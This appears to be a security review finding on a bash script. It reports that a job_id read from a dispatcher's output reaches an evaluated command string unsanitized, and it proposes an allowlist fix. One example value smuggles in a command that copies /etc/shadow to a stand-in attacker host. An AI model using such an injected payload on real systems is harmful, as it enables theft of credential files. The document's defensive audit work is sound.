---
finding_id: R3-F03
reviewer: sec-claude
severity: med
change_type: correctness
referenced_files:
  - scripts/run-codex-review.sh
---

# F03 — Stored shell injection via unsanitized job_id in await_cmd

**Location:** job_id extraction (lines 821-824) + `emit_dispatch_manifest_entry` `--arg await_cmd`

```bash
_job_id="${_line#JOB_ID=}"
...
--arg await_cmd "scripts/run-third-party-llm.sh await $job_id" \
```

`_job_id` is extracted from third-party dispatcher stdout by stripping the `JOB_ID=` prefix. No grammar check, no allowlist. Bash-expands into `await_cmd` string before jq sees it. Downstream `eval` of `await_cmd` executes whatever the job_id injects.

Unlike `REVIEWER_TAG` and `MODEL` (allowlist-validated at parse time), `job_id` arrives at runtime from an external program and is used without sanitization.

**Attack scenario:** a compromised or test-double `run-third-party-llm.sh` emits `JOB_ID=real-job-id; scp /etc/shadow attacker@evil.example:`. Manifest stores the injected payload. Downstream `bash -c "$(jq -r '.[0].await_cmd' ...)"` exfiltrates secrets. Especially relevant in CI environments where the dispatcher could be swapped for a test double, or supply-chain compromise.

**Fix:** validate `_job_id` immediately after extraction:

```bash
_job_id="${_line#JOB_ID=}"
if [[ -n "$_job_id" && ! "$_job_id" =~ ^[A-Za-z0-9_:@.-]+$ ]]; then
  echo "warning: JOB_ID from dispatcher contains unsafe characters — discarding" >&2
  _job_id=""
fi
```

Or store job_id and command template as separate manifest fields, with quote-assembly deferred to the executor.
